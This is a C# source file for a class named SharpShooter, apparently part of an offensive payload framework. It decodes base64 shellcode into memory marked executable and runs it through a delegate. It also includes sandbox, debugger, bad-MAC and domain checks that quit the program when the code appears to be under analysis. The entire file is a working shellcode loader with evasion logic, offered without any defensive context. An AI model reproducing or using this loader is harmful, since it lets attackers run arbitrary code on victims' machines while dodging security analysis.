using System.Runtime.InteropServices;
using System;

[ComVisible(true)]
public class SharpShooter
{

    [Flags]
    public enum AllocationType : uint
    {
        COMMIT = 0x1000,
        RESERVE = 0x2000,
        RESET = 0x80000,
        LARGE_PAGES = 0x20000000,
        PHYSICAL = 0x400000,
        TOP_DOWN = 0x100000,
        WRITE_WATCH = 0x200000
    }

    [Flags]
    public enum MemoryProtection : uint
    {
        EXECUTE = 0x10,
        EXECUTE_READ = 0x20,
        EXECUTE_READWRITE = 0x40,
        EXECUTE_WRITECOPY = 0x80,
        NOACCESS = 0x01,
        READONLY = 0x02,
        READWRITE = 0x04,
        WRITECOPY = 0x08,
        GUARD_Modifierflag = 0x100,
        NOCACHE_Modifierflag = 0x200,
        WRITECOMBINE_Modifierflag = 0x400
    }

    public enum FreeType : uint
    {
        MEM_DECOMMIT = 0x4000,
        MEM_RELEASE = 0x8000
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32")]
    private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, FreeType dwFreeType);

    [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
    public delegate Int32 ExecuteDelegate();

    public SharpShooter()
    {
    }

    public void CheckPlease(int check, string arg)
    {
        CheckPlease cp = new CheckPlease();
        switch(check)
        {
            case 0:
                if (!cp.isDomain(arg)) Environment.Exit(1);
                break;
            case 1:
                if (!cp.isDomainJoined()) Environment.Exit(1);
                break;
            case 2:
                if (cp.containsSandboxArtifacts()) Environment.Exit(1);
                break;
            case 3:
                if (cp.isBadMac()) Environment.Exit(1);
                break;
            case 4:
                if (cp.isDebugged()) Environment.Exit(1);
                break;

        }
    }

    public void Go(String shellcode64)
    {
        SharpShooter ss = new SharpShooter();
        ss.Shoot(shellcode64);
    }

    public void Shoot(String shellcode64)
    {
        byte[] sc = Convert.FromBase64String(shellcode64);

        IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);

        try
        {
            Marshal.Copy(sc, 0, baseAddr, sc.Length);
            ExecuteDelegate del = (ExecuteDelegate)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(ExecuteDelegate));

            del();
        }
        finally
        {
            VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
        }
    }



}


